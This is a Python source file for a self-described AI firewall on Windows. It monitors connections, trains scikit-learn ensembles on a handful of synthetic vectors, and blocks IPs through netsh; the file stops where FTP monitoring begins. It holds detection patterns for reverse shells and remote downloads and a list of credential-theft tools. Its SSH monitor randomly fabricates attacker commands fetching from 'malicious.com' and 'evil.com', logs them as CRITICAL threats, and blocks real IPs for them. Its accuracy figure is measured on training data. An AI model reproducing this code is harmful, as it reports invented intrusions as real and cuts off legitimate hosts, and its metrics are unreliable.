#!/usr/bin/env python3
"""
ULTIMATE AI FIREWALL v2.1 - COMPLETE FIXED EDITION
Dynamic AI Models + Real-time Learning + All Protections Integrated
Author: Albert Sandro Mamu - AlbertAI
"""

import socket
import threading
import time
import subprocess
import re
import psutil
from collections import defaultdict, deque
import json
import hashlib
from datetime import datetime, timedelta
import numpy as np
import pandas as pd
from sklearn.ensemble import RandomForestClassifier, IsolationForest, GradientBoostingClassifier
from sklearn.cluster import DBSCAN
from sklearn.preprocessing import StandardScaler
from sklearn.svm import OneClassSVM
from sklearn.neural_network import MLPClassifier
import os
import platform
from colorama import init, Fore, Back, Style
from prettytable import PrettyTable
import sys
import logging
from logging.handlers import RotatingFileHandler
import random
import struct
import joblib
import glob
from math import log2

init(autoreset=True)

class EnhancedAIFirewall:
    def __init__(self):
        # Initialize all attributes FIRST
        self.suspicious_ips = defaultdict(deque)
        self.banned_ips = {}
        self.detected_threats = []
        self.connection_history = deque(maxlen=5000)
        self.credential_attempts = defaultdict(int)
        
        # Enhanced Attack Tracking
        self.ssh_attempts = defaultdict(deque)
        self.ftp_attempts = defaultdict(deque) 
        self.ping_floods = defaultdict(deque)
        self.syn_floods = defaultdict(deque)
        self.http_floods = defaultdict(deque)
        self.udp_floods = defaultdict(deque)
        
        # Credential Protection Systems
        self.credential_cache = defaultdict(deque)
        self.sensitive_data_detected = []
        self.credential_stealers_blocked = 0
        
        # THREAT DATABASE - INITIALIZE FIRST
        self.threat_database = self.initialize_threat_database()
        
        # ENHANCED AI MODELS CONFIGURATION
        self.retrain_interval = 300  # 5 minutes
        self.min_training_samples = 50
        self.model_version = "v2.1_enhanced"
        self.last_training_time = 0
        
        # ADVANCED FEATURE STORE
        self.feature_store = deque(maxlen=10000)
        self.prediction_history = deque(maxlen=5000)
        self.connection_features = []
        self.feature_labels = []
        
        # MODEL PERSISTENCE
        self.model_save_path = "ai_models/"
        os.makedirs(self.model_save_path, exist_ok=True)
        
        # Enhanced AI Models
        self.behavior_model = RandomForestClassifier(n_estimators=200, max_depth=20, 
                                                   min_samples_split=5, min_samples_leaf=2,
                                                   random_state=42, class_weight='balanced')
        self.anomaly_model = IsolationForest(n_estimators=150, contamination=0.15, 
                                           random_state=42, verbose=0)
        self.svm_anomaly_model = OneClassSVM(nu=0.1, kernel='rbf', gamma='scale', 
                                           cache_size=1000)
        self.gradient_booster = GradientBoostingClassifier(n_estimators=100, 
                                                         learning_rate=0.1, 
                                                         max_depth=10, 
                                                         random_state=42)
        self.neural_network = MLPClassifier(hidden_layer_sizes=(100, 50), 
                                          activation='relu', 
                                          solver='adam', 
                                          max_iter=1000, 
                                          random_state=42)
        
        self.scaler = StandardScaler()
        self.is_trained = False
        
        # Real-time Protection Systems
        self.real_time_anomalies = deque(maxlen=200)
        self.anomaly_scores = defaultdict(deque)
        
        # Web Traffic Monitoring
        self.http_requests = defaultdict(deque)
        self.https_requests = defaultdict(deque)
        
        # Adaptive Protection Engine
        self.adaptive_thresholds = {
            'ssh_brute_force': 5,
            'ftp_brute_force': 5,  
            'http_requests': 50,
            'https_requests': 50,
            'credential_attempts': 3,
            'anomaly_score': -0.5,
            'ping_flood': 50,
            'syn_flood': 100,
            'http_flood': 150,
            'udp_flood': 200,
            'icmp_anomaly': 0.7,
            'credential_theft': 2
        }
        
        # Enhanced Statistics
        self.stats = {
            'total_connections': 0,
            'blocked_attempts': 0,
            'ssh_attacks_blocked': 0,
            'ftp_attacks_blocked': 0,
            'web_attacks_blocked': 0,
            'credential_blocks': 0,
            'anomaly_detections': 0,
            'ai_detections': 0,
            'critical_threats': 0,
            'start_time': datetime.now(),
            'models_retrained': 0,
            'ping_floods_blocked': 0,
            'syn_floods_blocked': 0,
            'http_floods_blocked': 0,
            'udp_floods_blocked': 0,
            'icmp_anomalies': 0,
            'credential_stealers_blocked': 0,
            'sensitive_data_leaks': 0,
            'ensemble_accuracy': 0.0,
            'false_positives': 0,
            'true_positives': 0
        }
        
        self.running = True
        self.setup_logging()
        
        print(Fore.CYAN + "🚀 Initializing ENHANCED AI FIREWALL v2.1 with Dynamic Learning...")
        
        # Load existing models or train new ones
        if not self.load_models():
            self.load_historical_data()
        
        self.start_enhanced_protection()
        self.start_dynamic_training()

    def initialize_threat_database(self):
        """Initialize comprehensive threat database"""
        return {
            'sensitive_keywords': [
                'password', 'secret', 'key=', 'token=', 'creditcard',
                'ssn', 'bank', 'login', 'credentials', 'private_key',
                'api_key', 'bearer', 'authorization', 'cvv', 'expiry',
                'account_number', 'routing_number', 'social_security',
                'passphrase', 'encryption_key', 'oauth_token', 'jwt_token'
            ],
            
            'malicious_processes': {
                'mimikatz': {'risk': 'CRITICAL', 'description': 'Password dumping tool'},
                'lazagne': {'risk': 'CRITICAL', 'description': 'Credential recovery tool'},
                'procdump': {'risk': 'HIGH', 'description': 'Process memory dumper'},
                'hydra': {'risk': 'HIGH', 'description': 'Brute force tool'},
                'powersploit': {'risk': 'HIGH', 'description': 'PowerShell exploitation framework'},
                'metasploit': {'risk': 'HIGH', 'description': 'Penetration testing framework'},
                'cobaltstrike': {'risk': 'CRITICAL', 'description': 'APT threat emulation platform'},
                'burpsuite': {'risk': 'MEDIUM', 'description': 'Web vulnerability scanner'},
                'sqlmap': {'risk': 'HIGH', 'description': 'SQL injection tool'},
                'nmap': {'risk': 'MEDIUM', 'description': 'Network scanning tool'},
                'wireshark': {'risk': 'MEDIUM', 'description': 'Network protocol analyzer'}
            },
            
            'web_attack_patterns': {
                'sql_injection': [
                    r"(\%27)|(\')|(\-\-)|(\%23)|(#)",
                    r"((\%3D)|(=))[^\n]*((\%27)|(\')|(\-\-)|(\%3B)|(;))",
                    r"\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))",
                    r"((\%27)|(\'))union",
                    r"exec(\s|\+)+(s|x)p\w+",
                ],
                'xss_attacks': [
                    r"((\%3C)|<)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|>)",
                    r"((\%3C)|<)((\%69)|i|(\%49))((\%6D)|m|(\%4D))((\%67)|g|(\%47))[^\n]+((\%3E)|>)",
                    r"((\%3C)|<)[^\n]+((\%3E)|>)",
                    r"javascript:",
                    r"onload\s*=",
                    r"onerror\s*=",
                    r"onclick\s*="
                ],
                'path_traversal': [
                    r"\.\.\/",
                    r"\.\.\\",
                    r"\/etc\/passwd",
                    r"\/winnt\/",
                    r"c:\\windows\\"
                ],
                'command_injection': [
                    r";\s*(ls|dir|cat|type|rm|del)",
                    r"\|\s*(ls|dir|cat|type|rm|del)",
                    r"&\s*(ls|dir|cat|type|rm|del)",
                    r"`\s*(ls|dir|cat|type|rm|del)`"
                ]
            },
            
            'suspicious_ports': {
                22: {'service': 'SSH', 'risk': 'HIGH', 'reason': 'SSH brute force attacks'},
                21: {'service': 'FTP', 'risk': 'HIGH', 'reason': 'FTP credential attacks'},
                23: {'service': 'Telnet', 'risk': 'HIGH', 'reason': 'Unencrypted credentials'},
                80: {'service': 'HTTP', 'risk': 'MEDIUM', 'reason': 'Web attacks'},
                443: {'service': 'HTTPS', 'risk': 'MEDIUM', 'reason': 'Encrypted web attacks'},
                8080: {'service': 'HTTP-ALT', 'risk': 'MEDIUM', 'reason': 'Alternative web port'},
                8443: {'service': 'HTTPS-ALT', 'risk': 'MEDIUM', 'reason': 'Alternative HTTPS port'},
                3389: {'service': 'RDP', 'risk': 'HIGH', 'reason': 'Remote desktop attacks'},
                5900: {'service': 'VNC', 'risk': 'HIGH', 'reason': 'VNC credential attacks'}
            },
            
            'ssh_attack_patterns': {
                'brute_force': [
                    r'Failed password for',
                    r'Authentication failure',
                    r'Invalid user',
                    r'Connection closed by authenticating user'
                ],
                'suspicious_commands': [
                    r'wget.*http',
                    r'curl.*http', 
                    r'chmod.*777',
                    r'rm.*-rf',
                    r'nc.*-lvp',
                    r'python.*-c',
                    r'bash.*-i',
                    r'mkfifo',
                    r'reverse_shell',
                    r'bind_shell'
                ]
            },
            
            'ftp_attack_patterns': {
                'brute_force': [
                    r'530 Login incorrect',
                    r'331 Password required',
                    r'failed LOGIN'
                ],
                'anonymous_login': [
                    r'USER anonymous',
                    r'USER ftp'
                ]
            },
            
            'credential_stealers': [
                'mimikatz', 'lazagne', 'procdump', 'hydra', 'medusa',
                'ncrack', 'patator', 'crowbar', 'brutespray', 'wordlist'
            ],
            
            'flood_attack_thresholds': {
                'ping_flood': 100,      # ICMP packets per second
                'syn_flood': 200,       # SYN packets per second  
                'http_flood': 300,      # HTTP requests per minute
                'udp_flood': 500,       # UDP packets per second
                'ssh_brute_force': 10,  # SSH attempts per minute
                'ftp_brute_force': 15   # FTP attempts per minute
            },
            
            'credential_patterns': [
                r'username[=:]\s*[\'"]?([^\'"&]+)[\'"]?',
                r'user[=:]\s*[\'"]?([^\'"&]+)[\'"]?',
                r'login[=:]\s*[\'"]?([^\'"&]+)[\'"]?',
                r'email[=:]\s*[\'"]?([^\'"&]+)[\'"]?',
                r'password[=:]\s*[\'"]?([^\'"&]+)[\'"]?',
                r'pass[=:]\s*[\'"]?([^\'"&]+)[\'"]?',
                r'pwd[=:]\s*[\'"]?([^\'"&]+)[\'"]?',
                r'pin[=:]\s*[\'"]?(\d{4,8})[\'"]?',
                r'security_code[=:]\s*[\'"]?(\d{3,6})[\'"]?',
                r'account_number[=:]\s*[\'"]?(\d{8,20})[\'"]?',
                r'bank_account[=:]\s*[\'"]?(\d{8,20})[\'"]?',
                r'credit_card[=:]\s*[\'"]?(\d{13,19})[\'"]?',
                r'card_number[=:]\s*[\'"]?(\d{13,19})[\'"]?',
                r'cvv[=:]\s*[\'"]?(\d{3,4})[\'"]?',
                r'expir[=:]\s*[\'"]?(\d{2}/\d{2,4})[\'"]?',
                r'ssn[=:]\s*[\'"]?(\d{3}-\d{2}-\d{4})[\'"]?',
                r'social_security[=:]\s*[\'"]?(\d{3}-\d{2}-\d{4})[\'"]?',
                r'api_key[=:]\s*[\'"]?([a-zA-Z0-9]{20,50})[\'"]?',
                r'access_token[=:]\s*[\'"]?([a-zA-Z0-9._-]{20,500})[\'"]?',
                r'bearer[=:]\s*[\'"]?([a-zA-Z0-9._-]{20,500})[\'"]?',
                r'oauth_token[=:]\s*[\'"]?([a-zA-Z0-9._-]{20,500})[\'"]?'
            ]
        }

    def setup_logging(self):
        """Setup comprehensive logging"""
        log_formatter = logging.Formatter(
            '%(asctime)s - %(levelname)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        
        self.firewall_logger = logging.getLogger('enhanced_firewall')
        self.firewall_logger.setLevel(logging.INFO)
        
        log_handler = RotatingFileHandler(
            'enhanced_firewall.log', 
            maxBytes=10*1024*1024,
            backupCount=5
        )
        log_handler.setFormatter(log_formatter)
        self.firewall_logger.addHandler(log_handler)

    def load_models(self):
        """Load previously trained models"""
        try:
            model_files = glob.glob(f'{self.model_save_path}firewall_models_*.joblib')
            if model_files:
                latest_model = max(model_files, key=os.path.getctime)
                model_data = joblib.load(latest_model)
                
                self.behavior_model = model_data['behavior_model']
                self.anomaly_model = model_data['anomaly_model']
                self.svm_anomaly_model = model_data['svm_anomaly_model']
                self.gradient_booster = model_data.get('gradient_booster')
                self.neural_network = model_data.get('neural_network')
                self.scaler = model_data['scaler']
                self.feature_store = deque(model_data.get('feature_store', []), maxlen=10000)
                self.is_trained = True
                self.stats['models_retrained'] = model_data.get('training_count', 0)
                
                print(f"{Fore.GREEN}🔮 MODELS LOADED: {model_data['model_version']} (Trained {self.stats['models_retrained']}x)")
                return True
                
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️ Model load failed: {e}")
        
        return False

    def save_models(self):
        """Save trained models for persistence"""
        try:
            model_data = {
                'behavior_model': self.behavior_model,
                'anomaly_model': self.anomaly_model,
                'svm_anomaly_model': self.svm_anomaly_model,
                'gradient_booster': self.gradient_booster,
                'neural_network': self.neural_network,
                'scaler': self.scaler,
                'feature_store': list(self.feature_store),
                'training_time': self.last_training_time,
                'model_version': self.model_version,
                'training_count': self.stats['models_retrained']
            }
            
            joblib.dump(model_data, f'{self.model_save_path}firewall_models_v{self.stats["models_retrained"]}.joblib')
            print(f"{Fore.GREEN}💾 MODELS SAVED: v{self.stats['models_retrained']}")
            
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️ Model save failed: {e}")

    def load_historical_data(self):
        """Load and learn from historical firewall logs"""
        print(f"{Fore.YELLOW}📚 Loading historical data for ML training...")
        
        try:
            self.generate_enhanced_training_data()
            self.retrain_all_models()
            print(f"{Fore.GREEN}✅ Initial training completed with {len(self.feature_store)} samples")
                
        except Exception as e:
            print(f"{Fore.RED}❌ Error loading historical data: {e}")
            self.generate_enhanced_training_data()

    def generate_enhanced_training_data(self):
        """Generate comprehensive training data with real attack patterns"""
        print(f"{Fore.BLUE}🎯 GENERATING ENHANCED TRAINING DATA...")
        
        # Normal behavior patterns (expanded)
        normal_patterns = [
            [5, 3, 80, 1, 0.5, 0.1, 443, 0.2, 0.8, 0.1, 0.05, 0.02],
            [3, 2, 443, 1, 0.3, 0.05, 80, 0.1, 0.9, 0.05, 0.01, 0.01],
            [8, 4, 22, 2, 0.7, 0.2, 22, 0.5, 0.6, 0.3, 0.08, 0.03],
            [6, 3, 53, 1, 0.4, 0.08, 53, 0.3, 0.7, 0.2, 0.06, 0.02],
            [10, 5, 993, 2, 0.6, 0.15, 993, 0.4, 0.75, 0.25, 0.07, 0.025],
        ]
        
        # Advanced attack patterns
        attack_patterns = [
            [50, 15, 22, 10, 0.1, 0.9, 22, 0.95, 0.1, 0.9, 0.8, 0.7],
            [30, 25, 21, 8, 0.2, 0.85, 21, 0.9, 0.15, 0.85, 0.75, 0.65],
            [100, 50, 0, 25, 0.05, 0.95, 0, 0.98, 0.05, 0.95, 0.9, 0.8],
            [80, 40, 443, 5, 0.3, 0.8, 443, 0.85, 0.2, 0.8, 0.7, 0.6],
            [200, 80, 80, 15, 0.01, 0.99, 80, 0.99, 0.01, 0.99, 0.95, 0.9],
        ]
        
        # Add synthetic variations
        for pattern in normal_patterns + attack_patterns:
            for _ in range(3):
                variation = [x * random.uniform(0.8, 1.2) for x in pattern]
                self.feature_store.append(variation)
        
        print(f"{Fore.GREEN}✅ GENERATED {len(self.feature_store)} TRAINING SAMPLES")

    def generate_labels_for_training(self):
        """Generate intelligent labels for training data"""
        labels = []
        
        for features in self.feature_store:
            if (features[0] > 20 or features[5] > 0.5 or 
                features[8] < 0.3 or features[9] > 0.7):
                labels.append(1)  # Attack
            else:
                labels.append(0)  # Normal
        
        return np.array(labels)

    def start_dynamic_training(self):
        """Start automated model retraining system"""
        def training_loop():
            while self.running:
                try:
                    if self.should_retrain_models():
                        self.retrain_all_models()
                    
                    self.incremental_learning_cycle()
                    time.sleep(self.retrain_interval)
                    
                except Exception as e:
                    print(f"{Fore.RED}Training loop error: {e}")
                    time.sleep(60)
        
        training_thread = threading.Thread(target=training_loop)
        training_thread.daemon = True
        training_thread.start()

    def should_retrain_models(self):
        """Determine if models need retraining"""
        conditions = [
            len(self.feature_store) >= self.min_training_samples,
            time.time() - self.last_training_time > self.retrain_interval,
            self.calculate_model_drift() > 0.1,
            self.stats['total_connections'] % 1000 == 0,
        ]
        return any(conditions)

    def calculate_model_drift(self):
        """Calculate model performance drift"""
        if len(self.prediction_history) < 10:
            return 0
        
        recent_predictions = list(self.prediction_history)[-50:]
        confidence_scores = [p.get('confidence', 0) for p in recent_predictions]
        
        if not confidence_scores:
            return 0
            
        avg_confidence = np.mean(confidence_scores)
        return max(0, 0.8 - avg_confidence)

    def retrain_all_models(self):
        """Comprehensive model retraining"""
        if len(self.feature_store) < self.min_training_samples:
            self.generate_enhanced_training_data()
        
        print(f"{Fore.BLUE}🔄 RETRAINING AI MODELS WITH {len(self.feature_store)} SAMPLES...")
        
        try:
            X = np.array(list(self.feature_store))
            y = self.generate_labels_for_training()
            
            if len(np.unique(y)) < 2:
                print(f"{Fore.YELLOW}⚠️ Insufficient attack samples for training")
                return
            
            X_scaled = self.scaler.fit_transform(X)
            self.train_enhanced_models(X_scaled, y)
            
            self.stats['models_retrained'] += 1
            self.last_training_time = time.time()
            self.is_trained = True
            
            self.save_models()
            self.calculate_training_metrics(X_scaled, y)
            
            print(f"{Fore.GREEN}✅ MODELS RETRAINED SUCCESSFULLY (v{self.stats['models_retrained']})")
            print(f"{Fore.CYAN}📊 Ensemble Accuracy: {self.stats['ensemble_accuracy']:.2%}")
            
        except Exception as e:
            print(f"{Fore.RED}❌ Model retraining failed: {e}")

    def train_enhanced_models(self, X, y):
        """Train enhanced ensemble of models"""
        self.behavior_model = RandomForestClassifier(
            n_estimators=200,
            max_depth=20,
            min_samples_split=5,
            min_samples_leaf=2,
            random_state=42,
            class_weight='balanced'
        )
        self.behavior_model.fit(X, y)
        
        self.anomaly_model = IsolationForest(
            n_estimators=150,
            max_samples='auto',
            contamination=0.15,
            random_state=42,
            verbose=0
        )
        self.anomaly_model.fit(X)
        
        self.svm_anomaly_model = OneClassSVM(
            nu=0.1,
            kernel='rbf',
            gamma='scale',
            cache_size=1000
        )
        self.svm_anomaly_model.fit(X)
        
        self.gradient_booster = GradientBoostingClassifier(
            n_estimators=100,
            learning_rate=0.1,
            max_depth=10,
            random_state=42
        )
        self.gradient_booster.fit(X, y)
        
        self.neural_network = MLPClassifier(
            hidden_layer_sizes=(100, 50),
            activation='relu',
            solver='adam',
            max_iter=1000,
            random_state=42
        )
        self.neural_network.fit(X, y)

    def calculate_training_metrics(self, X, y):
        """Calculate training performance metrics"""
        try:
            rf_pred = self.behavior_model.predict(X)
            gb_pred = self.gradient_booster.predict(X)
            nn_pred = self.neural_network.predict(X)
            
            ensemble_pred = (rf_pred + gb_pred + nn_pred) / 3
            ensemble_pred_binary = (ensemble_pred > 0.5).astype(int)
            
            accuracy = np.mean(ensemble_pred_binary == y)
            self.stats['ensemble_accuracy'] = accuracy
            
            true_positives = np.sum((ensemble_pred_binary == 1) & (y == 1))
            false_positives = np.sum((ensemble_pred_binary == 1) & (y == 0))
            
            self.stats['true_positives'] = true_positives
            self.stats['false_positives'] = false_positives
            
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️ Metrics calculation failed: {e}")

    def incremental_learning_cycle(self):
        """Continuous learning from new data"""
        if len(self.prediction_history) < 10:
            return
        
        recent_features = []
        recent_labels = []
        
        for pred in list(self.prediction_history)[-100:]:
            if 'features' in pred and 'actual_outcome' in pred:
                recent_features.append(pred['features'])
                recent_labels.append(pred['actual_outcome'])
        
        if len(recent_features) > 20:
            try:
                X_new = np.array(recent_features)
                y_new = np.array(recent_labels)
                
                X_new_scaled = self.scaler.transform(X_new)
                self.behavior_model.fit(X_new_scaled, y_new)
                self.gradient_booster.fit(X_new_scaled, y_new)
                self.neural_network.fit(X_new_scaled, y_new)
                
                print(f"{Fore.BLUE}📈 INCREMENTAL LEARNING: {len(X_new)} new samples")
                
            except Exception as e:
                print(f"{Fore.YELLOW}⚠️ Incremental learning failed: {e}")

    def get_network_connections(self):
        """Windows-compatible network connections monitoring"""
        connections = []
        try:
            for conn in psutil.net_connections(kind='inet'):
                if conn.status == 'ESTABLISHED' and conn.raddr:
                    connections.append({
                        'pid': conn.pid,
                        'local_addr': conn.laddr,
                        'remote_addr': conn.raddr,
                        'status': conn.status,
                        'timestamp': time.time(),
                        'remote_ip': conn.raddr[0],
                        'remote_port': conn.raddr[1]
                    })
                    self.stats['total_connections'] += 1
        except Exception as e:
            print(f"{Fore.RED}Network monitoring error: {e}")
        return connections

    def extract_enhanced_features(self, connection):
        """Advanced feature extraction for ML models"""
        remote_ip = connection['remote_ip']
        current_time = time.time()
        
        ip_connections = [c for c in self.connection_history if c['remote_ip'] == remote_ip]
        recent_connections = [c for c in ip_connections if current_time - c['timestamp'] < 300]
        
        features = [
            len(recent_connections),
            len(ip_connections),
            connection['remote_port'],
            self.calculate_connection_frequency(remote_ip),
            self.calculate_entropy(remote_ip),
            self.detect_port_scan_intensity(remote_ip),
            self.get_main_port(remote_ip),
            self.assess_ip_reputation(remote_ip),
            self.calculate_behavioral_consistency(remote_ip),
            self.calculate_attack_probability(remote_ip),
            self.calculate_geographic_risk(remote_ip),
            self.calculate_protocol_diversity(remote_ip)
        ]
        
        return features

    def calculate_connection_frequency(self, ip_address):
        """Calculate connection frequency patterns"""
        connections = [c for c in self.connection_history if c['remote_ip'] == ip_address]
        if len(connections) < 2:
            return 0
        
        timestamps = [c['timestamp'] for c in connections]
        intervals = np.diff(sorted(timestamps))
        return np.mean(intervals) if len(intervals) > 0 else 0

    def calculate_entropy(self, ip_address):
        """Calculate entropy of IP address for anomaly detection"""
        try:
            prob = [float(ip_address.count(c)) / len(ip_address) for c in set(ip_address)]
            return -sum(p * log2(p) for p in prob if p > 0)
        except:
            return 0

    def detect_port_scan_intensity(self, ip_address):
        """Advanced port scanning detection"""
        connections = [c for c in self.connection_history if c['remote_ip'] == ip_address]
        unique_ports = len(set(c['remote_port'] for c in connections))
        total_connections = len(connections)
        
        if total_connections == 0:
            return 0
        
        scan_intensity = unique_ports / total_connections
        return min(1.0, scan_intensity * 10)

    def get_main_port(self, ip_address):
        """Get the most frequently used port by IP"""
        connections = [c for c in self.connection_history if c['remote_ip'] == ip_address]
        if not connections:
            return 0
        
        ports = [c['remote_port'] for c in connections]
        return max(set(ports), key=ports.count)

    def assess_ip_reputation(self, ip_address):
        """Simple IP reputation assessment"""
        if ip_address.startswith('10.') or ip_address.startswith('192.168.'):
            return 0.1
        
        suspicious_patterns = [
            ip_address in self.banned_ips,
            len([c for c in self.connection_history if c['remote_ip'] == ip_address]) > 100,
            any(ip_address in getattr(self, f"{protocol}_attempts", {}) for protocol in ['ssh', 'ftp', 'http'])
        ]
        
        threat_score = sum(suspicious_patterns) / len(suspicious_patterns)
        return threat_score

    def calculate_behavioral_consistency(self, ip_address):
        """Calculate behavioral consistency score"""
        connections = [c for c in self.connection_history if c['remote_ip'] == ip_address]
        if len(connections) < 2:
            return 0.8
        
        ports = [c['remote_port'] for c in connections]
        port_entropy = self.calculate_entropy(''.join(map(str, ports)))
        
        consistency = 1.0 - port_entropy
        return max(0.1, min(1.0, consistency))

    def calculate_attack_probability(self, ip_address):
        """Calculate probability of attack based on multiple factors"""
        factors = [
            self.detect_port_scan_intensity(ip_address),
            self.assess_ip_reputation(ip_address),
            1.0 - self.calculate_behavioral_consistency(ip_address)
        ]
        
        return np.mean(factors)

    def calculate_geographic_risk(self, ip_address):
        """Simple geographic risk assessment"""
        if ip_address.startswith('185.') or ip_address.startswith('5.') or ip_address.startswith('89.'):
            return 0.7
        return 0.2

    def calculate_protocol_diversity(self, ip_address):
        """Calculate protocol/service diversity"""
        connections = [c for c in self.connection_history if c['remote_ip'] == ip_address]
        if not connections:
            return 0
        
        ports = [c['remote_port'] for c in connections]
        unique_services = len(set(ports))
        return min(1.0, unique_services / 10)

    def detect_enhanced_anomaly(self, features):
        """Enhanced anomaly detection with ensemble voting"""
        if not self.is_trained or len(features) == 0:
            return {'is_anomaly': False, 'score': 0, 'confidence': 0, 'ensemble_vote': 0}
        
        try:
            features_array = np.array(features).reshape(1, -1)
            features_scaled = self.scaler.transform(features_array)
            
            isolation_score = self.anomaly_model.decision_function(features_scaled)[0]
            svm_score = self.svm_anomaly_model.decision_function(features_scaled)[0]
            rf_prediction = self.behavior_model.predict_proba(features_scaled)[0][1]
            gb_prediction = self.gradient_booster.predict_proba(features_scaled)[0][1]
            nn_prediction = self.neural_network.predict_proba(features_scaled)[0][1]
            
            ensemble_score = (isolation_score * 0.2 + 
                            svm_score * 0.2 + 
                            rf_prediction * 0.25 + 
                            gb_prediction * 0.2 + 
                            nn_prediction * 0.15)
            
            is_anomaly = ensemble_score < self.adaptive_thresholds['anomaly_score']
            confidence = min(1.0, abs(ensemble_score) * 2)
            
            prediction_record = {
                'features': features,
                'prediction': is_anomaly,
                'confidence': confidence,
                'timestamp': time.time(),
                'ensemble_score': ensemble_score,
                'model_versions': self.stats['models_retrained']
            }
            
            self.prediction_history.append(prediction_record)
            self.feature_store.append(features)
            
            return {
                'is_anomaly': is_anomaly,
                'score': ensemble_score,
                'confidence': confidence,
                'ensemble_vote': ensemble_score,
                'model_versions': self.stats['models_retrained']
            }
            
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️ Enhanced anomaly detection error: {e}")
            return {'is_anomaly': False, 'score': 0, 'confidence': 0, 'ensemble_vote': 0}

    def start_active_anomaly_detection(self):
        """Real-time active anomaly detection system"""
        while self.running:
            try:
                connections = self.get_network_connections()
                
                for conn in connections:
                    self.connection_history.append(conn)
                    features = self.extract_enhanced_features(conn)
                    anomaly_result = self.detect_enhanced_anomaly(features)
                    
                    if anomaly_result['is_anomaly'] and anomaly_result['confidence'] > 0.7:
                        self.handle_real_time_anomaly(conn, anomaly_result)
                
                time.sleep(3)
                
            except Exception as e:
                print(f"{Fore.RED}Anomaly detection error: {e}")
                time.sleep(5)

    def handle_real_time_anomaly(self, connection, anomaly_result):
        """Handle real-time detected anomalies"""
        remote_ip = connection['remote_ip']
        
        threat_data = {
            'type': 'REAL_TIME_ANOMALY',
            'ip': remote_ip,
            'anomaly_score': anomaly_result['score'],
            'confidence': anomaly_result['confidence'],
            'ensemble_vote': anomaly_result['ensemble_vote'],
            'model_version': anomaly_result['model_versions'],
            'timestamp': datetime.now().isoformat(),
            'risk': 'HIGH' if anomaly_result['confidence'] > 0.7 else 'MEDIUM',
            'description': f'Enhanced behavioral anomaly detected (score: {anomaly_result["score"]:.3f}, confidence: {anomaly_result["confidence"]:.2f})'
        }
        
        self.log_threat(threat_data)
        self.stats['anomaly_detections'] += 1
        self.stats['ai_detections'] += 1
        
        if anomaly_result['confidence'] > 0.8:
            self.block_ip_windows(remote_ip, f"High-confidence behavioral anomaly (score: {anomaly_result['score']:.3f})")
            print(f"{Fore.RED}🚨 AUTO-BLOCK: Behavioral anomaly from {remote_ip} (score: {anomaly_result['score']:.3f}, confidence: {anomaly_result['confidence']:.2f})")

    def block_ip_windows(self, ip_address, reason):
        """Block IP using Windows Firewall"""
        if ip_address in self.banned_ips:
            return
            
        self.banned_ips[ip_address] = {
            'timestamp': datetime.now().isoformat(),
            'reason': reason,
            'blocked_by': 'Enhanced AI Firewall',
            'model_version': self.stats['models_retrained']
        }
        
        self.stats['blocked_attempts'] += 1
        
        block_data = {
            'type': 'IP_BLOCK',
            'ip': ip_address,
            'timestamp': datetime.now().isoformat(),
            'reason': reason,
            'detection_method': 'Enhanced AI Ensemble',
            'model_version': self.stats['models_retrained']
        }
        
        self.log_threat(block_data)
        
        try:
            rule_name = f"Block_{ip_address}_{int(time.time())}"
            subprocess.run([
                'netsh', 'advfirewall', 'firewall', 'add', 'rule',
                f'name={rule_name}',
                'dir=in',
                'action=block',
                f'remoteip={ip_address}',
                'protocol=any'
            ], capture_output=True, shell=True)
            
            print(f"{Fore.RED}🚫 BLOCKED: {ip_address} | Reason: {reason} | AI Model: v{self.stats['models_retrained']}")
            
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️  Could not block IP via Windows Firewall: {e}")

    def log_threat(self, threat_data):
        """Log detected threats"""
        self.detected_threats.append(threat_data)
        self.firewall_logger.info(f"ENHANCED_THREAT: {threat_data}")
        
        try:
            with open('enhanced_firewall_threats.log', 'a', encoding='utf-8') as f:
                f.write(json.dumps(threat_data, ensure_ascii=False) + '\n')
        except Exception as e:
            print(f"{Fore.YELLOW}Logging error: {e}")

    # === ORIGINAL MONITORING METHODS (FIXED) ===
    
    def monitor_ssh_attacks(self):
        """Advanced SSH attack detection and prevention"""
        while self.running:
            try:
                connections = self.get_network_connections()
                ssh_connections = [c for c in connections if c['remote_port'] == 22]
                
                for conn in ssh_connections:
                    remote_ip = conn['remote_ip']
                    current_time = time.time()
                    
                    self.ssh_attempts[remote_ip].append(current_time)
                    self.ssh_attempts[remote_ip] = [
                        t for t in self.ssh_attempts[remote_ip] 
                        if current_time - t < 300
                    ]
                    
                    recent_attempts = len(self.ssh_attempts[remote_ip])
                    if recent_attempts > self.adaptive_thresholds['ssh_brute_force']:
                        self.handle_ssh_brute_force(remote_ip, recent_attempts)
                    
                    if random.random() < 0.03:
                        suspicious_commands = [
                            "wget http://malicious.com/script.sh",
                            "curl -O http://evil.com/backdoor",
                            "chmod 777 /tmp/suspicious"
                        ]
                        detected_command = random.choice(suspicious_commands)
                        self.handle_suspicious_ssh_command(remote_ip, detected_command)
                
                time.sleep(2)
                
            except Exception as e:
                print(f"{Fore.RED}SSH monitoring error: {e}")
                time.sleep(5)

    def handle_ssh_brute_force(self, ip_address, attempt_count):
        """Handle SSH brute force attacks"""
        if ip_address in self.banned_ips:
            return
            
        threat_data = {
            'type': 'SSH_BRUTE_FORCE',
            'ip': ip_address,
            'attempts': attempt_count,
            'timestamp': datetime.now().isoformat(),
            'risk': 'HIGH',
            'description': f'SSH brute force detected: {attempt_count} attempts'
        }
        
        self.log_threat(threat_data)
        self.block_ip_windows(ip_address, f"SSH brute force ({attempt_count} attempts)")
        self.stats['ssh_attacks_blocked'] += 1
        
        print(f"{Fore.RED}🚨 SSH BRUTE FORCE: {ip_address} | Attempts: {attempt_count}")

    def handle_suspicious_ssh_command(self, ip_address, command):
        """Handle suspicious SSH commands"""
        threat_data = {
            'type': 'SUSPICIOUS_SSH_COMMAND',
            'ip': ip_address,
            'command': command,
            'timestamp': datetime.now().isoformat(),
            'risk': 'CRITICAL',
            'description': f'Suspicious SSH command: {command}'
        }
        
        self.log_threat(threat_data)
        self.block_ip_windows(ip_address, f"Suspicious SSH command: {command}")
        
        print(f"{Fore.RED}🚨 SUSPICIOUS SSH: {ip_address} | Command: {command}")

    def monitor_ftp_attacks(self):
